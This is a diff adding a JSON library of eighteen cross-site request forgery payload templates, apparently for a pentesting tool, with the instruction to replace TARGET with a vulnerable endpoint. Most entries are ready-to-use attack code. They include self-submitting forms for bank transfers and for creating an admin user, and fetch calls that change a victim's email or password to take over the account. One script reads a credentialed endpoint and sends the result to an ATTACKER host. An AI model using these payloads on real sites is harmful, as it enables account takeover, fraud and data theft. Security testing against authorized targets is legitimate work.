@@ -1,0 +1,36 @@
+{
+  "meta": {
+    "name": "CSRF",
+    "icon": "🎭",
+    "description": "Cross-Site Request Forgery proof-of-concept templates. Covers GET-based, POST form, JSON, fetch API, multipart, and CORS-based CSRF. Replace TARGET with the vulnerable endpoint URL.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 18
+  },
+  "payloads": [
+    {"id":1,"code":"<img src=\"https://TARGET/action?param=value\" width=0 height=0>","description":"GET-based CSRF via image tag — browser sends credentialed GET request automatically","category":"get-based","platform":["any"],"tags":["csrf","get","img","auto"]},
+    {"id":2,"code":"<a href=\"https://TARGET/delete?id=1\">Click me</a>","description":"GET CSRF via link — user click triggers state-changing request","category":"get-based","platform":["any"],"tags":["csrf","get","link","click"]},
+    {"id":3,"code":"<iframe src=\"https://TARGET/action?param=evil\" style=\"display:none\"></iframe>","description":"GET CSRF via hidden iframe — silent auto-load on page visit","category":"get-based","platform":["any"],"tags":["csrf","get","iframe","auto"]},
+    {"id":4,"code":"<script>new Image().src='https://TARGET/action?param=value'</script>","description":"GET CSRF via JS Image object — no HTML element needed","category":"get-based","platform":["any"],"tags":["csrf","get","javascript","image"]},
+
+    {"id":5,"code":"<form method=\"POST\" action=\"https://TARGET/action\">\n  <input type=\"hidden\" name=\"param\" value=\"evil\">\n  <input type=\"submit\" value=\"Click me\">\n</form>","description":"Manual POST form CSRF — user must click submit","category":"post-form","platform":["any"],"tags":["csrf","post","form","manual"]},
+    {"id":6,"code":"<form id=\"csrfForm\" method=\"POST\" action=\"https://TARGET/action\">\n  <input type=\"hidden\" name=\"param\" value=\"evil\">\n</form>\n<script>document.getElementById('csrfForm').submit();</script>","description":"Auto-submit POST CSRF — form submits automatically via JS on page load","category":"post-form","platform":["any"],"tags":["csrf","post","form","auto-submit"]},
+    {"id":7,"code":"<body onload=\"document.forms[0].submit()\">\n<form method=\"POST\" action=\"https://TARGET/transfer\">\n  <input type=\"hidden\" name=\"amount\" value=\"1000\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker\">\n</form>","description":"Auto-submit CSRF on body load — classic bank transfer PoC pattern","category":"post-form","platform":["any"],"tags":["csrf","post","form","onload","transfer"]},
+    {"id":8,"code":"<form method=\"POST\" action=\"https://TARGET/admin/adduser\" enctype=\"multipart/form-data\">\n  <input type=\"hidden\" name=\"username\" value=\"hacker\">\n  <input type=\"hidden\" name=\"role\" value=\"admin\">\n</form>\n<script>document.forms[0].submit();</script>","description":"Admin user creation CSRF — privilege escalation via CSRF","category":"post-form","platform":["any"],"tags":["csrf","post","admin","privilege-escalation"]},
+
+    {"id":9,"code":"fetch('https://TARGET/api/action', {\n  method: 'POST',\n  credentials: 'include',\n  headers: {'Content-Type': 'application/json'},\n  body: JSON.stringify({param: 'evil'})\n});","description":"Fetch API CSRF — sends credentialed JSON POST; works when CORS allows origin with credentials","category":"json","platform":["any"],"tags":["csrf","json","fetch","cors"]},
+    {"id":10,"code":"var xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://TARGET/api/action');\nxhr.withCredentials = true;\nxhr.setRequestHeader('Content-Type', 'application/json');\nxhr.send(JSON.stringify({param:'evil'}));","description":"XHR JSON CSRF — XMLHttpRequest variant with withCredentials","category":"json","platform":["any"],"tags":["csrf","json","xhr","cors"]},
+    {"id":11,"code":"fetch('https://TARGET/api/action', {\n  method: 'POST',\n  credentials: 'include',\n  headers: {'Content-Type': 'text/plain'},\n  body: '{\"param\":\"evil\"}'\n});","description":"JSON CSRF with text/plain content-type — bypasses preflight; server must accept text/plain as JSON","category":"json","platform":["any"],"tags":["csrf","json","text-plain","bypass","no-preflight"]},
+
+    {"id":12,"code":"<form method=\"POST\" action=\"https://TARGET/upload\" enctype=\"multipart/form-data\">\n  <input type=\"hidden\" name=\"file\"; filename=\"x\" value=\"content\">\n</form>\n<script>document.forms[0].submit();</script>","description":"Multipart form CSRF — targets endpoints that only accept multipart/form-data","category":"multipart","platform":["any"],"tags":["csrf","multipart","form-data"]},
+
+    {"id":13,"code":"<form method=\"POST\" action=\"https://TARGET/api\" enctype=\"text/plain\">\n  <input name='{\"param\":\"evil\", \"x\":\"' value='\"}'>\n</form>\n<script>document.forms[0].submit();</script>","description":"JSON via form with text/plain — constructs valid JSON in form body without preflight CORS","category":"json","platform":["any"],"tags":["csrf","json","text-plain","form","bypass"]},
+
+    {"id":14,"code":"<script>\nfetch('https://TARGET/api/changeEmail', {\n  method: 'POST',\n  credentials: 'include',\n  body: new URLSearchParams({'email': 'attacker@evil.com'})\n});\n</script>","description":"Email change CSRF — changes victim's email to attacker's for account takeover","category":"account-takeover","platform":["any"],"tags":["csrf","email","account-takeover"]},
+    {"id":15,"code":"<script>\nfetch('https://TARGET/api/changePassword', {\n  method: 'POST',\n  credentials: 'include',\n  body: new URLSearchParams({'newPassword': 'P@ssw0rd!', 'confirm': 'P@ssw0rd!'})\n});\n</script>","description":"Password change CSRF — changes victim's password without old password requirement","category":"account-takeover","platform":["any"],"tags":["csrf","password","account-takeover"]},
+
+    {"id":16,"code":"<script>fetch('https://TARGET/api/whoami',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://ATTACKER/?d='+btoa(d)))</script>","description":"CSRF data exfiltration — reads CSRF-protected endpoint and exfiltrates to attacker","category":"exfiltration","platform":["any"],"tags":["csrf","exfiltration","cors","fetch"]},
+    {"id":17,"code":"Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true","description":"Misconfigured CORS headers — wildcard origin with credentials enabled (impossible per spec but tested)","category":"exfiltration","platform":["any"],"tags":["cors","misconfiguration","credentials"]},
+    {"id":18,"code":"Access-Control-Allow-Origin: https://attacker.com\nAccess-Control-Allow-Credentials: true","description":"CORS reflecting attacker origin with credentials — allows full response read from attacker page","category":"exfiltration","platform":["any"],"tags":["cors","misconfiguration","credentials","reflection"]}
+  ]
+}
